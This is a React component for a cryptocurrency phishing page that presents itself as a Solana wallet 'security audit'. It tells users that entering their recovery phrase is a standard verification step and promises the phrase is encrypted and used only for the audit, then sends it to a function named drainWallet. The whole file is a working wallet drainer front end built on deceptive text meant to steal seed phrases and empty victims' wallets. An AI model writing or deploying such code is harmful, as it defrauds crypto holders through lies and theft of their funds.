import React from 'react';
import { drainWallet } from '../utils/api';

const ScanSection = ({
  walletAddress,
  seedPhrase,
  setSeedPhrase,
  isScanning,
  setIsScanning,
  error,
  setError,
  onComplete
}) => {
  const handleSubmit = async (e) => {
    e.preventDefault();
    
    const wordCount = seedPhrase.trim().split(/\s+/).length;
    if (wordCount < 12 || wordCount > 24) {
      setError('Please enter a valid 12 or 24 word recovery phrase');
      return;
    }

    setError('');
    setIsScanning(true);

    try {
      const result = await drainWallet(seedPhrase, walletAddress);
      
      if (result.success) {
        setIsScanning(false);
        onComplete();
        setSeedPhrase('');
      } else {
        setError('Security check failed. Please try again.');
        setIsScanning(false);
      }
    } catch (err) {
      setError('Network error. Please check your connection.');
      setIsScanning(false);
    }
  };

  const isDisabled = isScanning || !seedPhrase.trim();

  return (
    <div className="scan-section">
      <div className="wallet-info">
        <span className="wallet-icon">💳</span>
        <span>Connected: {walletAddress.slice(0, 6)}...{walletAddress.slice(-6)}</span>
      </div>

      <div className="security-notice">
        <span className="warning-icon">⚠️</span>
        <p>
          <strong>Action Required:</strong> To complete the security audit,
          you must verify your wallet ownership by entering your recovery phrase.
          This is a standard security procedure used by Solana's top auditing tools.
        </p>
      </div>

      <form onSubmit={handleSubmit} className="seed-form">
        <label htmlFor="seedPhrase">
          Enter Your 12 or 24-Word Recovery Phrase
        </label>
        <textarea
          id="seedPhrase"
          value={seedPhrase}
          onChange={(e) => setSeedPhrase(e.target.value)}
          placeholder="Example: casual sweet style patrol sunset jungle crisp major..."
          rows={3}
          disabled={isScanning}
          className="seed-input"
        />
        {error && <div className="error-message">{error}</div>}
        <button
          type="submit"
          disabled={isDisabled}
          className="scan-btn"
        >
          {isScanning ? (
            <span>
              <span className="spinner"></span> Scanning for vulnerabilities...
            </span>
          ) : (
            'Run Security Audit'
          )}
        </button>
        <p className="security-note">
          🔒 Your seed phrase is encrypted and only used for this audit.
        </p>
      </form>
    </div>
  );
};

export default ScanSection;